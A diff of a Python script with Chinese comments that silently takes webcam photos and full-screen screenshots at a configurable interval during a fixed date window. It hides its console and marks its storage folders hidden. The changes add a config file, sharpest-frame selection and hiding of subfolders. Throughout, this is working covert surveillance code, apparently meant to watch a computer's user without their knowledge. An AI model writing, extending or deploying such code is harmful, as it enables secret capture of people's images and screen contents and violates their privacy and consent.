@@ -8,23 +8,91 @@ import threading
 from pathlib import Path
 
 import cv2
+import numpy as np
 from PIL import ImageGrab
 
-# -------------------- 配置参数 --------------------
+# -------------------- 默认配置参数 --------------------
 BASE_DIR = Path("D:/HiddenCaptures")          # 隐藏根目录
+CONFIG_FILE = BASE_DIR / "config.txt"         # 配置文件路径
 CAM_SUBDIR = "Camera"                         # 摄像头子目录
 SCR_SUBDIR = "Screenshot"                     # 截屏子目录
 LOG_FILE = "capture.log"                      # 日志文件（置于根目录）
 
-INTERVAL_SECONDS = 30 * 60                    # 30分钟
-RETRY_DELAY = 5 * 60                          # 失败后重试等待（秒）
-MAX_RETRIES = 3                               # 单次任务最大重试次数
-CAM_WARMUP_FRAMES = 30                        # 摄像头丢弃帧数
-CAMERA_INDEX = 0                              # 默认摄像头索引
-
 # 可运行日期范围
 VALID_START = datetime.date(2026, 5, 25)
 VALID_END = datetime.date(2026, 5, 27)
+
+# 默认配置值（会被 config.txt 覆盖）
+DEFAULT_CONFIG = {
+    "camera_index": "0",
+    "warmup_frames": "30",          # 丢弃帧数（等待对焦稳定）
+    "quality_samples": "5",         # 采集多帧择优保存
+    "retry_delay_seconds": "300",   # 失败重试等待（秒）
+    "max_retries": "3",
+    "interval_minutes": "30",
+}
+
+# 运行时配置变量
+config = {}
+
+# -------------------- 配置管理 --------------------
+def load_or_create_config():
+    """读取配置文件，如果不存在则用默认值创建。返回配置字典。"""
+    global config
+
+    # 确保基础目录存在
+    BASE_DIR.mkdir(parents=True, exist_ok=True)
+
+    if CONFIG_FILE.exists():
+        # 读取现有配置
+        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if "=" in line:
+                    key, value = line.split("=", 1)
+                    key = key.strip()
+                    value = value.strip()
+                    if key in DEFAULT_CONFIG:
+                        config[key] = value
+        # 补全缺失的配置项
+        for k, v in DEFAULT_CONFIG.items():
+            if k not in config:
+                config[k] = v
+    else:
+        # 创建默认配置文件
+        config = DEFAULT_CONFIG.copy()
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+            f.write("# 摄像头与截图自动保存配置\n")
+            f.write("# 摄像头索引：0 通常为内置摄像头，1 为外接\n")
+            f.write(f"camera_index={config['camera_index']}\n\n")
+            f.write("# 预热丢弃帧数：等待摄像头对焦稳定\n")
+            f.write(f"warmup_frames={config['warmup_frames']}\n\n")
+            f.write("# 清晰度采样帧数：拍摄多帧，自动选择最清晰的保存\n")
+            f.write(f"quality_samples={config['quality_samples']}\n\n")
+            f.write("# 失败重试等待时间（秒）\n")
+            f.write(f"retry_delay_seconds={config['retry_delay_seconds']}\n\n")
+            f.write("# 最大重试次数\n")
+            f.write(f"max_retries={config['max_retries']}\n\n")
+            f.write("# 拍摄间隔（分钟）\n")
+            f.write(f"interval_minutes={config['interval_minutes']}\n")
+        logging.info("已创建默认配置文件 config.txt")
+
+    # 确保所有值都是有效的整数
+    for k in config:
+        if k in DEFAULT_CONFIG:
+            try:
+                int(config[k])
+            except ValueError:
+                logging.error(f"配置项 {k} 值无效 ({config[k]})，使用默认值 {DEFAULT_CONFIG[k]}")
+                config[k] = DEFAULT_CONFIG[k]
+
+    return config
+
+def get_config_int(key):
+    """安全获取整数配置值"""
+    return int(config.get(key, DEFAULT_CONFIG[key]))
 
 # -------------------- 工具函数 --------------------
 def hide_console():
@@ -41,7 +109,6 @@ def ensure_dir(path: Path, hidden: bool = False):
     path.mkdir(parents=True, exist_ok=True)
     if hidden and os.name == 'nt':
         try:
-            # 设置文件夹为隐藏
             ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02)
         except Exception:
             pass
@@ -56,57 +123,71 @@ def setup_logging(log_path: Path):
     logger = logging.getLogger()
     logger.setLevel(logging.INFO)
 
-    # 文件日志处理器
     file_handler = logging.FileHandler(str(log_path), encoding='utf-8')
     file_handler.setLevel(logging.INFO)
     file_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
     file_handler.setFormatter(file_formatter)
     logger.addHandler(file_handler)
 
-    # 控制台处理器：仅在 stdout 可用时添加（避免无控制台崩溃）
+    # 控制台处理器：仅在 stdout 可用时添加
     if sys.stdout is not None:
         console_handler = logging.StreamHandler()
         console_handler.setLevel(logging.INFO)
         console_handler.setFormatter(file_formatter)
         logger.addHandler(console_handler)
 
+# -------------------- 清晰度评估函数 --------------------
+def calculate_sharpness(frame):
+    """使用拉普拉斯方差评估图像清晰度，值越大越清晰"""
+    if frame is None:
+        return 0.0
+    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+    return cv2.Laplacian(gray, cv2.CV_64F).var()
+
 # -------------------- 核心捕获逻辑 --------------------
 def capture_camera(save_path: Path) -> bool:
-    """
-    打开摄像头，丢弃前几帧以等待稳定，拍摄一张高质量照片。
-    成功返回 True，失败返回 False。
-    """
+    """打开摄像头，预热，采集多帧并自动选择最清晰的保存。"""
+    camera_index = get_config_int("camera_index")
+    warmup = get_config_int("warmup_frames")
+    samples = get_config_int("quality_samples")
+
     cap = None
     try:
-        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)  # Windows下使用DSHOW加速
+        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
         if not cap.isOpened():
-            logging.error("无法打开摄像头")
+            logging.error(f"无法打开摄像头 (索引 {camera_index})")
             return False
 
-        # 尝试设置高分辨率
         cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
         cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
-        # 有些摄像头可能需要MJPG格式才能达到高分辨率
         cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
 
-        # 丢弃前N帧，等待自动曝光/白平衡稳定
-        for _ in range(CAM_WARMUP_FRAMES):
+        for _ in range(warmup):
             ret, _ = cap.read()
             if not ret:
-                logging.warning("预热帧读取失败")
+                logging.warning("预热帧读取失败，可能摄像头异常")
                 break
-            time.sleep(0.05)  # 短暂等待，让摄像头调整
+            time.sleep(0.05)
 
-        # 拍摄最终帧
-        ret, frame = cap.read()
-        if not ret or frame is None:
-            logging.error("拍摄照片失败")
+        best_frame = None
+        best_sharpness = -1.0
+        for i in range(samples):
+            ret, frame = cap.read()
+            if not ret or frame is None:
+                logging.warning(f"清晰度采样帧 {i+1} 读取失败")
+                continue
+            sharp = calculate_sharpness(frame)
+            if sharp > best_sharpness:
+                best_sharpness = sharp
+                best_frame = frame.copy()
+
+        if best_frame is None:
+            logging.error("未能采集到任何有效帧")
             return False
 
-        # 保存为高质量PNG
         save_path.parent.mkdir(parents=True, exist_ok=True)
-        cv2.imwrite(str(save_path), frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
-        logging.info(f"摄像头照片已保存: {save_path}")
+        cv2.imwrite(str(save_path), best_frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
+        logging.info(f"摄像头照片已保存: {save_path} (清晰度: {best_sharpness:.2f})")
         return True
 
     except Exception as e:
@@ -117,11 +198,9 @@ def capture_camera(save_path: Path) -> bool:
             cap.release()
 
 def capture_screen(save_path: Path) -> bool:
-    """
-    截取整个屏幕并保存。锁屏或失败时静默忽略，返回 False。
-    """
+    """截取整个屏幕并保存。锁屏或失败时静默忽略。"""
     try:
-        img = ImageGrab.grab(all_screens=True)  # all_screens=True 包含所有显示器
+        img = ImageGrab.grab(all_screens=True)
         if img is None:
             logging.warning("截屏返回空图像（可能锁屏或远程桌面）")
             return False
@@ -132,7 +211,6 @@ def capture_screen(save_path: Path) -> bool:
         return True
 
     except OSError as e:
-        # 锁屏、无显示器会话等常见错误
         logging.warning(f"截屏失败（可能锁屏或会话不可用）: {e}")
         return False
     except Exception as e:
@@ -140,72 +218,62 @@ def capture_screen(save_path: Path) -> bool:
         return False
 
 def execute_task_with_retry():
-    """
-    执行一次拍摄任务：分别拍摄摄像头和截屏，
-    若摄像头失败则等待 RETRY_DELAY 后重试（最多 MAX_RETRIES 次），
-    截屏失败仅记录，不重试。
-    """
+    """执行一次拍摄任务：摄像头可重试，截屏仅尝试一次。"""
+    max_retries = get_config_int("max_retries")
+    retry_delay = get_config_int("retry_delay_seconds")
     timestamp = get_timestamp()
     cam_dir = BASE_DIR / CAM_SUBDIR
     scr_dir = BASE_DIR / SCR_SUBDIR
 
-    # --- 摄像头任务（可重试） ---
     success_cam = False
-    for attempt in range(1, MAX_RETRIES + 1):
+    for attempt in range(1, max_retries + 1):
         cam_path = cam_dir / f"{timestamp}_cam.png"
         if capture_camera(cam_path):
             success_cam = True
             break
         else:
             logging.warning(f"摄像头拍摄失败，第{attempt}次尝试")
-            if attempt < MAX_RETRIES:
-                logging.info(f"等待 {RETRY_DELAY} 秒后重试...")
-                time.sleep(RETRY_DELAY)
-                # 重试时更新时间戳，避免文件名冲突
+            if attempt < max_retries:
+                logging.info(f"等待 {retry_delay} 秒后重试...")
+                time.sleep(retry_delay)
                 timestamp = get_timestamp()
     if not success_cam:
         logging.error("摄像头拍摄最终失败，放弃本次摄像头任务")
 
-    # --- 屏幕截图任务（不重试） ---
     scr_path = scr_dir / f"{timestamp}_scr.png"
-    capture_screen(scr_path)  # 失败也不影响后续
+    capture_screen(scr_path)
 
 # -------------------- 正常模式（后台定时） --------------------
 def normal_mode():
-    """检查日期，若在有效范围内则进入定时循环"""
     today = datetime.date.today()
     if not (VALID_START <= today <= VALID_END):
         logging.info(f"当前日期 {today} 不在允许范围内 ({VALID_START} ~ {VALID_END})，程序退出。")
         sys.exit(0)
 
-    logging.info("进入正常监控模式，每30分钟执行一次拍摄...")
+    interval = get_config_int("interval_minutes") * 60
+    logging.info(f"进入正常监控模式，每 {get_config_int('interval_minutes')} 分钟执行一次拍摄...")
     while True:
         try:
             execute_task_with_retry()
         except Exception as e:
             logging.error(f"任务执行出现未捕获异常: {e}")
-        # 等待间隔，但在等待期间可被KeyboardInterrupt中断
-        time.sleep(INTERVAL_SECONDS)
+        time.sleep(interval)
 
-# -------------------- 测试模式（带简单窗口） --------------------
+# -------------------- 测试模式 --------------------
 def test_mode():
-    """带窗口的测试模式，可手动触发拍摄"""
     import tkinter as tk
     from tkinter import messagebox
 
-    # 确保根目录和日志已准备
     ensure_dir(BASE_DIR, hidden=True)
     ensure_dir(BASE_DIR / CAM_SUBDIR)
     ensure_dir(BASE_DIR / SCR_SUBDIR)
 
     def run_task():
-        """在后台线程运行任务，完成后更新UI"""
         btn.config(state=tk.DISABLED)
         status_var.set("正在拍摄，请稍候...")
         def worker():
             try:
                 execute_task_with_retry()
-                # 成功提示在主线程
                 root.after(0, lambda: status_var.set("任务完成！可查看保存的图片。"))
             except Exception as e:
                 root.after(0, lambda: messagebox.showerror("错误", f"发生异常:\n{e}"))
@@ -215,12 +283,12 @@ def test_mode():
 
     root = tk.Tk()
     root.title("测试模式 - 屏幕与摄像头捕获")
-    root.geometry("320x180")
+    root.geometry("340x200")
     root.resizable(False, False)
 
     tk.Label(root, text="测试控制面板", font=("微软雅黑", 12)).pack(pady=10)
     status_var = tk.StringVar(value="点击按钮立即执行一次拍摄")
-    tk.Label(root, textvariable=status_var, wraplength=280).pack(pady=5)
+    tk.Label(root, textvariable=status_var, wraplength=300).pack(pady=5)
     btn = tk.Button(root, text="立即拍摄", command=run_task, width=15, height=2)
     btn.pack(pady=10)
 
@@ -229,20 +297,28 @@ def test_mode():
 
 # -------------------- 主入口 --------------------
 if __name__ == "__main__":
-    # 隐藏控制台（即使在 .pyw 下也无害）
     hide_console()
+    BASE_DIR.mkdir(parents=True, exist_ok=True)
 
-    # 确保隐藏根目录存在
-    ensure_dir(BASE_DIR, hidden=True)
-    # 创建子目录
+    config = load_or_create_config()
+
+    # 设置根目录隐藏
+    if os.name == 'nt':
+        try:
+            ctypes.windll.kernel32.SetFileAttributesW(str(BASE_DIR), 0x02)
+        except:
+            pass
+
     ensure_dir(BASE_DIR / CAM_SUBDIR)
     ensure_dir(BASE_DIR / SCR_SUBDIR)
+    for sub in [CAM_SUBDIR, SCR_SUBDIR]:
+        try:
+            ctypes.windll.kernel32.SetFileAttributesW(str(BASE_DIR / sub), 0x02)
+        except:
+            pass
 
-    # 配置日志
     setup_logging(BASE_DIR / LOG_FILE)
 
-    # 判断运行模式：只有命令行参数包含 "test" 才进入测试模式，其余均以正常模式运行
-    # 对多余参数不做任何报错或退出，统统忽略
     if "test" in sys.argv:
         logging.info("以测试模式启动")
         test_mode()
